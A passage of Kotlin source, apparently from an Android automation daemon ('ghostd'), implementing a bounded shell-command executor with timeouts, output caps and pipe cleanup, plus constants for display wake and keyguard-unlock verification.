     * bounded; a timed-out child is destroyed so the worker cannot linger
     * after the server gives up.
     *
     * On timeout/interrupt the child's stdin and both pipes are closed after
     * destroy so blocked readers wake and descendants get EOF/SIGPIPE.
     */
    internal fun shell(
        command: String,
        timeoutMs: Long = SHELL_TIMEOUT_MS,
        maxOutputBytes: Int = SHELL_MAX_OUTPUT_BYTES
    ): JSONObject {
        val proc = try {
            Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
        } catch (e: Exception) {
            return JSONObject().put("rc", -1)
                .put("stdout", "")
                .put("stderr", "failed to start: ${e.message}")
        }

        val stdout = AtomicReference(StreamCapture("", false))
        val stderr = AtomicReference(StreamCapture("", false))
        val stdoutThread = Thread {
            stdout.set(readBounded(proc.inputStream, maxOutputBytes))
        }.apply {
            isDaemon = true
            name = "ghostd-shell-stdout"
        }
        val stderrThread = Thread {
            stderr.set(readBounded(proc.errorStream, maxOutputBytes))
        }.apply {
            isDaemon = true
            name = "ghostd-shell-stderr"
        }
        stdoutThread.start()
        stderrThread.start()

        var timedOut = false
        val rc = try {
            if (proc.waitFor(timeoutMs, TimeUnit.MILLISECONDS)) {
                proc.exitValue()
            } else {
                timedOut = true
                proc.destroy()
                if (!proc.waitFor(500, TimeUnit.MILLISECONDS)) {
                    proc.destroyForcibly()
                    proc.waitFor(500, TimeUnit.MILLISECONDS)
                }
                -1
            }
        } catch (_: InterruptedException) {
            Thread.currentThread().interrupt()
            timedOut = true
            proc.destroyForcibly()
            -1
        }

        // On timeout/force-kill close the pipes immediately: this wakes the
        // reader threads (Thread.interrupt() does NOT unblock a native read)
        // and gives any descendants EOF/SIGPIPE instead of leaving them
        // blocked on a full pipe.
        if (timedOut) closeProcessStreams(proc)

        // A normally-exiting child has already written to the pipes; let the
        // readers drain them before closing so no output is lost.
        joinReader(stdoutThread)
        joinReader(stderrThread)

        // Always release the pipe FDs, and unblock a reader that is somehow
        // still stuck after the bounded join above.
        closeProcessStreams(proc)
        joinReader(stdoutThread, PIPE_CLOSE_JOIN_MS)
        joinReader(stderrThread, PIPE_CLOSE_JOIN_MS)

        val so = stdout.get()
        val se = stderr.get()
        val out = JSONObject()
            .put("rc", rc)
            .put("stdout", so.text)
            .put("stderr", se.text)
        if (timedOut) out.put("timed_out", true)
        if (so.truncated || se.truncated) out.put("truncated", true)
        return out
    }

    private class StreamCapture(val text: String, val truncated: Boolean)

    /**
     * Read a stream up to [cap] bytes, then keep draining (discarding) so
     * the child never blocks on a full pipe. Returns the captured text and
     * whether anything was dropped.
     */
    private fun readBounded(stream: java.io.InputStream, cap: Int): StreamCapture {
        val limit = cap.coerceAtLeast(0)
        val buf = java.io.ByteArrayOutputStream()
        val chunk = ByteArray(8192)
        var truncated = false
        try {
            while (true) {
                val n = stream.read(chunk)
                if (n < 0) break
                if (buf.size() < limit) {
                    val write = minOf(n, limit - buf.size())
                    buf.write(chunk, 0, write)
                    if (write < n) truncated = true
                } else {
                    truncated = true
                }
            }
        } catch (_: Exception) {
            // stream closed when the process exits / is destroyed
        }
        return StreamCapture(buf.toString("UTF-8"), truncated)
    }

    /** Close all three child pipes so no reader thread or FD is left behind. */
    private fun closeProcessStreams(proc: Process) {
        try {
            proc.outputStream.close()
        } catch (_: Exception) {
        }
        try {
            proc.errorStream.close()
        } catch (_: Exception) {
        }
        try {
            proc.inputStream.close()
        } catch (_: Exception) {
        }
    }

    private fun joinReader(thread: Thread, timeoutMs: Long = READER_JOIN_MS) {
        try {
            thread.join(timeoutMs)
        } catch (_: InterruptedException) {
            Thread.currentThread().interrupt()
        }
    }

    private fun error(cmdId: String, message: String): JSONObject = JSONObject()
        .put("type", "result").put("cmd_id", cmdId).put("id", cmdId)
        .put("status", "error").put("ok", false).put("result", message)

    /** Safety cap for files tree output entries. */
    private const val TREE_ENTRY_CAP = 10_000

    /** Bound for shell execution: kill a child that runs too long. */
    private const val SHELL_TIMEOUT_MS = 30_000L

    /** Bounds accepted from `shell --timeout`. */
    private const val SHELL_MIN_TIMEOUT_MS = 100L
    private const val SHELL_MAX_TIMEOUT_MS = 600_000L

    /** Bound each captured stream so a runaway command cannot exhaust memory. */
    private const val SHELL_MAX_OUTPUT_BYTES = 1_000_000

    /** Bounds accepted from `shell --max-bytes`. */
    private const val SHELL_MIN_OUTPUT_BYTES = 1
    private const val SHELL_MAX_OUTPUT_CAP = 10_000_000

    /** Bounded wait for the pipe readers after the child has exited/was killed. */
    private const val READER_JOIN_MS = 1_000L

    /** Extra wait after closing the pipes to let readers record their result. */
    private const val PIPE_CLOSE_JOIN_MS = 200L

    /** Wait for the display to report interactive after an explicit wake. */
    private const val WAKE_WAIT_MS = 3_000L
    private const val INTERACTIVE_POLL_MS = 100L

    /**
     * How long ghostd waits for KeyguardManager to confirm the unlock after
     * ghosta says it submitted the PIN. ghosta has its own bounded wait; this
     * is the independent proof that the keyguard is actually gone.
     */
    private const val UNLOCK_VERIFY_MS = 5_000L
    private const val UNLOCK_POLL_MS = 200L

    /** Brief grace before turning a ghosta failure into a confirmed failure. */
    private const val SIDEKICK_FAILURE_SETTLE_MS = 2_500L
}
